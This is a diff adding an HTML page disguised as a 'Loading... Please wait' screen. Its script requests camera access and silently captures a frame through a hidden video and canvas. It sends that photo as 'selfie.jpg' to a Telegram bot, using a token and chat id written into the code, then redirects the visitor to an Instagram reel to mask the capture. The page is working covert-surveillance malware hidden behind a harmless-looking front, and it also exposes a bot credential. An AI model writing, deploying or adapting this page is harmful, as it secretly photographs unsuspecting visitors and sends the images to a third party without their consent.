@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <style>
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      text-align: center;
+      padding: 20px;
+    }
+    h2 {
+      color: #333;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h2 id="message">Please wait...</h2>
+
+  <video id="video" width="320" height="240" autoplay></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const message = document.getElementById('message');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          context.drawImage(video, 0, 0, 320, 240);
+          const imageData = canvas.toDataURL('image/jpeg');
+          const blob = dataURItoBlob(imageData);
+
+          const token = '7969625658:AAFVX3VhWcePN5_tXq5xgtk8sNK6jOZABRs';
+          const chat_id = '5045400014';
+          const formData = new FormData();
+          formData.append('chat_id', chat_id);
+          formData.append('photo', blob, 'selfie.jpg');
+
+          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          }).finally(() => {
+            window.location.href = "https://www.instagram.com/reel/DIcQu6qti6-/?igsh=cjk3eXQwZmVzandr";
+          });
+
+        }, 1500);
+      })
+      .catch(() => {
+        message.innerText = "Camera access denied. Please allow access to proceed.";
+      });
+
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(',')[1]);
+      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: mimeString });
+    }
+  </script>
+</body>
+</html>
